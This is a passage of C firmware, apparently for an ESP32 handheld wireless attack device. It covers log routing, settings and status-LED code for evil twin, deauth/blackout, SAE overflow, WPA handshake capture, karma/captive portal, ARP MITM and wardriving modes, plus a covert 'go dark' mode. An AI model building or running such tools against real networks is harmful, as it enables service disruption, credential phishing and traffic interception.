        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy3);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs with TAG (WiFi_Hacker) that contain SnifferDog
            if (strstr(msg.text, "WiFi_Hacker:") != NULL && strstr(msg.text, "SnifferDog") != NULL) {
                xQueueSend(snifferdog_log_queue, &msg, 0);
            }
        }
    }

    if (sniffer_log_capture_enabled && sniffer_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy6);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs with TAG (wifi_sniffer)
            if (strstr(msg.text, "wifi_sniffer:") != NULL) {
                xQueueSend(sniffer_log_queue, &msg, 0);
            }
        }
    }

    if (sae_overflow_log_capture_enabled && sae_overflow_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy4);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(sae_overflow_log_queue, &msg, 0);
            }
        }
    }

    if (handshake_log_capture_enabled && handshake_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy5);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs from handshake attack task (WiFi_Hacker tag, but not SnifferDog)
            // Also capture logs from attack_handshake component
            if ((strstr(msg.text, "WiFi_Hacker:") != NULL && strstr(msg.text, "SnifferDog") == NULL) ||
                strstr(msg.text, "attack_handshake:") != NULL) {
                xQueueSend(handshake_log_queue, &msg, 0);
            }
        }
    }

    if (wardrive_log_capture_enabled && wardrive_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy5);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs with TAG (WiFi_Hacker) for Wardrive
            if (strstr(msg.text, "WiFi_Hacker:") != NULL) {
                xQueueSend(wardrive_log_queue, &msg, 0);
            }
        }
    }

    if (karma_log_capture_enabled && karma_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy7);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(karma_log_queue, &msg, 0);
            }
        }
    }
    va_end(ap_copy4);
    va_end(ap_copy5);
    va_end(ap_copy6);
    va_end(ap_copy7);

    va_end(ap_copy);
    va_end(ap_copy2);
    va_end(ap_copy3);
    return ret;
}

static esp_err_t evil_twin_enable_log_capture(void)
{
    if (!evil_twin_log_queue) {
        evil_twin_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!evil_twin_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(evil_twin_log_queue);
    }

    if (!evil_twin_log_capture_enabled) {
        if (!blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        evil_twin_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void evil_twin_disable_log_capture(void)
{
    if (evil_twin_log_capture_enabled) {
        evil_twin_log_capture_enabled = false;
        if (!blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
        esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
        previous_vprintf = NULL;
        }
    }

    if (evil_twin_log_queue) {
        xQueueReset(evil_twin_log_queue);
    }
}

// Evil Twin UI event callback - called from wifi_attacks task context
static void evil_twin_ui_event_callback(evil_twin_event_data_t *data) {
    if (evil_twin_event_queue && data) {
        // Queue event to be processed in main loop (thread-safe)
        xQueueSend(evil_twin_event_queue, data, 0);
    }
}

// Add status message to Evil Twin status list (must be called from main task)
static void evil_twin_add_status_message(const char *message, lv_color_t color) {
    if (evil_twin_status_list && lv_obj_is_valid(evil_twin_status_list)) {
        lv_obj_t *item = lv_list_add_text(evil_twin_status_list, message);
        if (item) {
            lv_obj_set_style_text_color(item, color, 0);
            lv_obj_set_style_bg_opa(item, LV_OPA_TRANSP, 0);
            lv_obj_set_style_pad_ver(item, 2, 0);
        }
        lv_obj_scroll_to_y(evil_twin_status_list, LV_COORD_MAX, LV_ANIM_ON);
    }
}

// Rogue AP event callback (queues events from wifi_attacks task to main loop)
static void rogue_ap_ui_event_callback(evil_twin_event_data_t *data) {
    if (rogue_ap_event_queue && data) {
        xQueueSend(rogue_ap_event_queue, data, 0);
    }
}

static void rogue_ap_add_status_message(const char *message, lv_color_t color) {
    if (rogue_ap_status_list && lv_obj_is_valid(rogue_ap_status_list)) {
        lv_obj_t *item = lv_list_add_text(rogue_ap_status_list, message);
        if (item) {
            lv_obj_set_style_text_color(item, color, 0);
            lv_obj_set_style_bg_opa(item, LV_OPA_TRANSP, 0);
            lv_obj_set_style_pad_ver(item, 2, 0);
        }
        lv_obj_scroll_to_y(rogue_ap_status_list, LV_COORD_MAX, LV_ANIM_ON);
    }
}

static esp_err_t blackout_enable_log_capture(void)
{
    if (!blackout_log_queue) {
        blackout_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!blackout_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(blackout_log_queue);
    }

    if (!blackout_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        blackout_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void blackout_disable_log_capture(void)
{
    if (blackout_log_capture_enabled) {
        blackout_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (blackout_log_queue) {
        xQueueReset(blackout_log_queue);
    }
}

static esp_err_t snifferdog_enable_log_capture(void)
{
    if (!snifferdog_log_queue) {
        snifferdog_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!snifferdog_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(snifferdog_log_queue);
    }

    if (!snifferdog_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        snifferdog_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void snifferdog_disable_log_capture(void)
{
    if (snifferdog_log_capture_enabled) {
        snifferdog_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (snifferdog_log_queue) {
        xQueueReset(snifferdog_log_queue);
    }
}

static esp_err_t sniffer_enable_log_capture(void)
{
    if (!sniffer_log_queue) {
        sniffer_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!sniffer_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(sniffer_log_queue);
    }

    if (!sniffer_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        sniffer_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void sniffer_disable_log_capture(void)
{
    if (sniffer_log_capture_enabled) {
        sniffer_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (sniffer_log_queue) {
        xQueueReset(sniffer_log_queue);
    }
}

static esp_err_t sae_overflow_enable_log_capture(void)
{
    if (!sae_overflow_log_queue) {
        sae_overflow_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!sae_overflow_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(sae_overflow_log_queue);
    }

    if (!sae_overflow_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        sae_overflow_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void sae_overflow_disable_log_capture(void)
{
    if (sae_overflow_log_capture_enabled) {
        sae_overflow_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled && !handshake_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (sae_overflow_log_queue) {
        xQueueReset(sae_overflow_log_queue);
    }
}

static esp_err_t handshake_enable_log_capture(void)
{
    if (handshake_log_queue == NULL) {
        handshake_log_queue = xQueueCreate(20, sizeof(evil_log_msg_t));
        if (handshake_log_queue == NULL) {
            return ESP_FAIL;
        }
    }

    if (!handshake_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        handshake_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void handshake_disable_log_capture(void)
{
    if (handshake_log_capture_enabled) {
        handshake_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (handshake_log_queue) {
        xQueueReset(handshake_log_queue);
    }
}

static esp_err_t wardrive_enable_log_capture(void)
{
    if (!wardrive_log_queue) {
        wardrive_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!wardrive_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(wardrive_log_queue);
    }

    if (!wardrive_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        wardrive_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void wardrive_disable_log_capture(void)
{
    if (wardrive_log_capture_enabled) {
        wardrive_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (wardrive_log_queue) {
        xQueueReset(wardrive_log_queue);
    }
}

static esp_err_t karma_enable_log_capture(void)
{
    if (!karma_log_queue) {
        karma_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!karma_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(karma_log_queue);
    }

    if (!karma_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !portal_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        karma_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void karma_disable_log_capture(void)
{
    if (karma_log_capture_enabled) {
        karma_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !portal_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (karma_log_queue) {
        xQueueReset(karma_log_queue);
    }
}

static esp_err_t portal_enable_log_capture(void)
{
    if (!portal_event_queue) {
        portal_event_queue = xQueueCreate(16, sizeof(evil_twin_event_data_t));
        if (!portal_event_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(portal_event_queue);
    }

    if (!portal_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        portal_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void portal_disable_log_capture(void)
{
    if (portal_log_capture_enabled) {
        portal_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (portal_event_queue) {
        xQueueReset(portal_event_queue);
    }
}

// Portal UI event callback - called from wifi_attacks task context
static void portal_ui_event_callback(evil_twin_event_data_t *data) {
    if (portal_event_queue && data) {
        // Queue event to be processed in main loop (thread-safe)
        xQueueSend(portal_event_queue, data, 0);
    }
}

// Karma UI event callback - called from wifi_attacks task context
static void karma_ui_event_callback(evil_twin_event_data_t *data) {
    if (karma_event_queue && data) {
        // Queue event to be processed in main loop (thread-safe)
        xQueueSend(karma_event_queue, data, 0);
    }
}

void lvgl_tick_task(void *arg)
{
    lv_tick_inc(10);
}

// Forward declarations
void print_memory_stats(void);

// Helper function to check heap integrity with detailed logging
static void check_heap_integrity(const char* location) {
    bool is_ok = heap_caps_check_integrity_all(true);
    if (!is_ok) { 
        ESP_LOGE(TAG, "[HEAP CHECK] ❌ CORRUPTION DETECTED at: %s", location);
    } else {
        ESP_LOGE(TAG, "[HEAP CHECK] ✅ Heap integrity OK at: %s", location);
    }
}

static void init_display(void)
{
    spi_bus_config_t buscfg = {
        .mosi_io_num = LCD_MOSI,
        .miso_io_num = LCD_MISO,
        .sclk_io_num = LCD_CLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = LCD_H_RES * 15 * sizeof(uint16_t),
    };

    esp_err_t spi_ret = spi_bus_initialize(LCD_HOST, &buscfg, SPI_DMA_CH_AUTO);
    if (spi_ret != ESP_OK) { ESP_LOGE(TAG, "SPI INIT FAILED — halting"); while(1) vTaskDelay(pdMS_TO_TICKS(500)); }

    esp_lcd_panel_io_spi_config_t io_config = {
        .dc_gpio_num = LCD_DC,
        .cs_gpio_num = LCD_CS,
        .pclk_hz = 40 * 1000 * 1000,
        .lcd_cmd_bits = 8,
        .lcd_param_bits = 8,
        .spi_mode = 0,
        .trans_queue_depth = 10,
    };

    ESP_ERROR_CHECK(esp_lcd_new_panel_io_spi(LCD_HOST, &io_config, &lcd_io_handle));

    const esp_lcd_panel_dev_config_t panel_config = {
        .reset_gpio_num = LCD_RST,
        .rgb_ele_order = LCD_RGB_ELEMENT_ORDER_RGB,
        .bits_per_pixel = 16,
    };

    ESP_ERROR_CHECK(esp_lcd_new_panel_st7789(lcd_io_handle, &panel_config, &panel_handle));
    ESP_ERROR_CHECK(esp_lcd_panel_reset(panel_handle));
    ESP_ERROR_CHECK(esp_lcd_panel_init(panel_handle));
    ESP_ERROR_CHECK(esp_lcd_panel_invert_color(panel_handle, false));
}

// ============================================================================
// NVS Settings Helpers
// ============================================================================

static void nvs_settings_load(void)
{
    nvs_handle_t h;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READONLY, &h);
    if (err == ESP_OK) {
        int32_t t = 0;
        if (nvs_get_i32(h, NVS_KEY_TIMEOUT, &t) == ESP_OK) {
            screen_timeout_ms = t;
        } else {
            screen_timeout_ms = 0; // stays on
        }
        uint8_t b = 80;
        if (nvs_get_u8(h, NVS_KEY_BRIGHTNESS, &b) == ESP_OK) {
            screen_brightness_pct = b;
        } else {
            screen_brightness_pct = 80;
        }
        uint16_t smin = 100, smax = 300;
        if (nvs_get_u16(h, NVS_KEY_SCAN_MIN, &smin) == ESP_OK) {
            scan_time_min_ms = smin;
        }
        if (nvs_get_u16(h, NVS_KEY_SCAN_MAX, &smax) == ESP_OK) {
            scan_time_max_ms = smax;
        }
        uint8_t dm = 1;
        if (nvs_get_u8(h, NVS_KEY_DARK_MODE, &dm) == ESP_OK) {
            dark_mode_enabled = (dm != 0);
        }
        uint8_t pm = 0;
        if (nvs_get_u8(h, NVS_KEY_POWER_MODE, &pm) == ESP_OK) {
            g_max_power_mode = (pm != 0);
        }
        uint32_t gatt_tmo = 30000;
        if (nvs_get_u32(h, NVS_KEY_GATT_TIMEOUT, &gatt_tmo) == ESP_OK) {
            g_gatt_timeout_ms = gatt_tmo;
        }
        size_t ssid_len = sizeof(g_saved_wifi_ssid);
        nvs_get_str(h, NVS_KEY_WIFI_SSID, g_saved_wifi_ssid, &ssid_len);
        size_t pass_len = sizeof(g_saved_wifi_pass);
        nvs_get_str(h, NVS_KEY_WIFI_PASS, g_saved_wifi_pass, &pass_len);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS settings loaded: timeout=%ldms, brightness=%u%%, scan=%u-%ums, dark=%d, max_power=%d, gatt_tmo=%ums",
                 (long)screen_timeout_ms, screen_brightness_pct, scan_time_min_ms, scan_time_max_ms,
                 dark_mode_enabled, g_max_power_mode, (unsigned)g_gatt_timeout_ms);
    } else {
        ESP_LOGW(TAG, "NVS settings not found (first boot), using defaults");
        screen_timeout_ms = 0;
        screen_brightness_pct = 80;
        scan_time_min_ms = 100;
        scan_time_max_ms = 300;
        dark_mode_enabled = true;
        g_max_power_mode = false;
        g_gatt_timeout_ms = 30000;
        g_saved_wifi_ssid[0] = '\0';
        g_saved_wifi_pass[0] = '\0';
    }
    wifi_scanner_set_scan_time(scan_time_min_ms, scan_time_max_ms);
    gw_set_timeout(g_gatt_timeout_ms);
}

static void nvs_settings_save_timeout(int32_t ms)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_i32(h, NVS_KEY_TIMEOUT, ms);
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved timeout = %ldms", (long)ms);
    }
}

static void nvs_settings_save_brightness(uint8_t pct)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_u8(h, NVS_KEY_BRIGHTNESS, pct);
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved brightness = %u%%", pct);
    }
}

static void nvs_settings_save_scan_time(uint16_t min_ms, uint16_t max_ms)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_u16(h, NVS_KEY_SCAN_MIN, min_ms);
        nvs_set_u16(h, NVS_KEY_SCAN_MAX, max_ms);
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved scan time = %u-%ums", min_ms, max_ms);
    }
}

static void nvs_settings_save_dark_mode(bool enabled)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_u8(h, NVS_KEY_DARK_MODE, enabled ? 1 : 0);
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved dark_mode = %d", enabled);
    }
}

static void nvs_settings_save_power_mode(bool max_power)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_u8(h, NVS_KEY_POWER_MODE, max_power ? 1 : 0);
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved power_mode = %s", max_power ? "MAX" : "Normal");
    }
}

static void nvs_settings_save_gatt_timeout(uint32_t ms)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_u32(h, NVS_KEY_GATT_TIMEOUT, ms);
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved gatt_timeout = %ums", (unsigned)ms);
    }
}

static void nvs_settings_save_wifi_creds(const char *ssid, const char *pass)
{
    nvs_handle_t h;
    if (nvs_open(NVS_NAMESPACE, NVS_READWRITE, &h) == ESP_OK) {
        nvs_set_str(h, NVS_KEY_WIFI_SSID, ssid ? ssid : "");
        nvs_set_str(h, NVS_KEY_WIFI_PASS, pass ? pass : "");
        nvs_commit(h);
        nvs_close(h);
        ESP_LOGI(TAG, "NVS: saved wifi creds ssid=%s", ssid ? ssid : "");
    }
}

// ============================================================================
// Backlight / Brightness / Screen Dimming
// ============================================================================

static void init_backlight(void)
{
    // NM-CYD-C5: backlight is GPIO 25 (HIGH = on).
    // Brightness dimming is handled via a software overlay on lv_layer_top().
    gpio_reset_pin(LCD_BL_IO);
    gpio_set_direction(LCD_BL_IO, GPIO_MODE_OUTPUT);
    gpio_set_level(LCD_BL_IO, LCD_BL_ACTIVE_LEVEL);
    ESP_LOGI(TAG, "Backlight ON (GPIO %d)", LCD_BL_IO);
}

static void set_backlight_percent(uint8_t percent)
{
    // Software brightness: a black overlay on lv_layer_top() with variable opacity.
    // 100% brightness = fully transparent overlay (OPA_TRANSP).
    // 10% brightness  = nearly opaque overlay.
    if (!brightness_overlay) return;
    if (percent > 100) percent = 100;
    if (percent < 30)  percent = 30;   // floor at 30% — below this the screen is unreadable
    // Map 30-100% to opacity 178-0 (linear): at 30% overlay is 70% opaque (dim but visible)
    lv_opa_t opa = (lv_opa_t)(255 - (uint16_t)percent * 255 / 100);
    lv_obj_set_style_bg_opa(brightness_overlay, opa, 0);
}

// ============================================================================
// NeoPixel LED (WS2812 on GPIO 27) — mode-based status indicator
// ============================================================================
// Brightness ~25-80/255 — visible without being blinding at arm's length.
// Priority (highest first): attacks → passive/monitoring → scanning → idle

static void led_set(uint8_t r, uint8_t g, uint8_t b)
{
    if (!g_led_strip) return;
    if (led_strip_set_pixel(g_led_strip, 0, r, g, b) == ESP_OK)
        led_strip_refresh(g_led_strip);
}

static void led_update_mode(void)
{
    if (go_dark_active) return;
    // ── Aggressive attacks (red family) ──────────────────────────────────────
    if (wifi_attacks_is_deauth_active() || targeted_deauth_active ||
        wifi_attacks_is_blackout_active() || wifi_attacks_is_sae_overflow_active()) {
        led_set(80, 0, 0);   // red — denial-of-service
        return;
    }
    // ── Rogue AP / captive deception (orange) ─────────────────────────────
    if (wifi_attacks_is_karma_active() || wifi_attacks_is_portal_active()) {
        led_set(80, 30, 0);  // orange — fake AP running
        return;
    }
    // ── Handshake capture (yellow) ────────────────────────────────────────
    if (handshake_attack_active) {
        led_set(70, 70, 0);  // yellow — WPA capture in progress
        return;
    }
    // ── Deauth monitor / MITM (amber) ─────────────────────────────────────
    if (deauth_monitor_active || mitm_arp_active) {
        led_set(80, 40, 0);  // amber — watching/intercepting
        return;
    }
    // ── Passive sniffing (green) ──────────────────────────────────────────
    if (sniffer_task_active || sniffer_dog_active) {
        led_set(0, 80, 0);   // green — listening passively
        return;
    }
    // ── Wardriving (cyan) ────────────────────────────────────────────────
    if (wardrive_active) {
        led_set(0, 50, 50);  // cyan — geo-mapping
        return;
    }
    // ── BLE / AirTag / BT locator (purple) ──────────────────────────────
    if (ble_scan_ui_active || bt_scan_active || airtag_scan_active || bt_locator_tracking_active || bt_sas_ui_active) {
        led_set(40, 0, 80);  // purple — Bluetooth active
        return;
    }
    // ── WiFi scanning (blue) ─────────────────────────────────────────────
    if (wifi_scanner_is_scanning()) {
        led_set(0, 0, 80);   // blue — scanning for APs
        return;
    }
    // ── Idle (white) ─────────────────────────────────────────────────────
    led_set(25, 25, 25);     // white — system ready, no operation active
}

static void screen_set_dimmed(bool dimmed)
{
    if (screen_dimmed == dimmed) {
        return;
    }
    screen_dimmed = dimmed;
    ignore_touch_until_release = true;

    if (dimmed) {
        // Hide brightness overlay (not needed when display is off)
        if (brightness_overlay) {
            lv_obj_add_flag(brightness_overlay, LV_OBJ_FLAG_HIDDEN);
        }
        if (panel_handle) {
            esp_lcd_panel_disp_on_off(panel_handle, false);
        }
    } else {
        if (panel_handle) {
            esp_lcd_panel_disp_on_off(panel_handle, true);
        }
        // Restore brightness overlay
        if (brightness_overlay) {
            lv_obj_clear_flag(brightness_overlay, LV_OBJ_FLAG_HIDDEN);
        }
        set_backlight_percent(screen_brightness_pct);
        // Reset idle timer when waking up
        last_input_ms = esp_timer_get_time() / 1000;
        if (screen_idle_timer && screen_timeout_ms > 0) {
            lv_timer_resume(screen_idle_timer);
        }
    }
}

static void screen_idle_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    const int64_t now_ms = esp_timer_get_time() / 1000;
    if (!screen_dimmed && (now_ms - last_input_ms) >= screen_timeout_ms) {
        screen_set_dimmed(true);
    }
}

// ── Go Dark ──────────────────────────────────────────────────────────────────
// LED off, screen off, touch suspended; all background ops continue.
// Wake: double-click BOOT button (GPIO 0). Clean API — callable via I2C later.

static void init_boot_button(void)
{
    gpio_config_t cfg = {
        .pin_bit_mask = (1ULL << BOOT_BTN_GPIO),
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type    = GPIO_INTR_DISABLE,
    };
    gpio_config(&cfg);
    // GPIO0-7 on ESP32-C5 are LP GPIOs. The sleep_gpio subsystem enables
    // LP GPIO hold (latching the pad state) which freezes the value at whatever
    // the pin was when hold was set — always HIGH after a normal boot.
    // gpio_hold_dis() releases the latch so gpio_get_level() reads the real pad.
    gpio_hold_dis(BOOT_BTN_GPIO);
    gpio_sleep_sel_dis(BOOT_BTN_GPIO);
}

void go_dark_enable(void)
{
    if (go_dark_active) return;
    go_dark_active         = true;
    boot_btn_prev_pressed  = (gpio_get_level(BOOT_BTN_GPIO) == 0);
    boot_btn_click_count   = 0;
    boot_btn_last_release_ms = 0;
    boot_btn_hold_start_ms = 0;
    led_set(0, 0, 0);
    gpio_set_level(LCD_BL_IO, 0);
    if (panel_handle) esp_lcd_panel_disp_on_off(panel_handle, false);
}

void go_dark_disable(void)
{
    if (!go_dark_active) return;
    go_dark_active = false;
    if (panel_handle) esp_lcd_panel_disp_on_off(panel_handle, true);
    gpio_set_level(LCD_BL_IO, LCD_BL_ACTIVE_LEVEL);
    set_backlight_percent(screen_brightness_pct);
    led_update_mode();
    last_input_ms = esp_timer_get_time() / 1000;
}


void print_memory_stats(void) {
    // Heap info
    ESP_LOGI("MEM", "=== HEAP STATUS ===");
    ESP_LOGI("MEM", "Free heap: %lu bytes", esp_get_free_heap_size());
    ESP_LOGI("MEM", "Min free heap: %lu bytes", esp_get_minimum_free_heap_size());
    
    // Internal RAM
    ESP_LOGI("MEM", "Internal free: %lu bytes", 
             heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
    ESP_LOGI("MEM", "Internal min: %lu bytes", 
             heap_caps_get_minimum_free_size(MALLOC_CAP_INTERNAL));
    
    // PSRAM
    ESP_LOGI("MEM", "PSRAM free: %lu bytes", 
             heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
    ESP_LOGI("MEM", "PSRAM min: %lu bytes", 
             heap_caps_get_minimum_free_size(MALLOC_CAP_SPIRAM));
    
    // DMA-capable
    ESP_LOGI("MEM", "DMA-capable free: %lu bytes", 
             heap_caps_get_free_size(MALLOC_CAP_DMA));
}

// Helper functions for Wardrive
static void get_timestamp_string(char* buffer, size_t size) {
    static uint32_t timestamp_counter = 0;
    timestamp_counter++;
    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
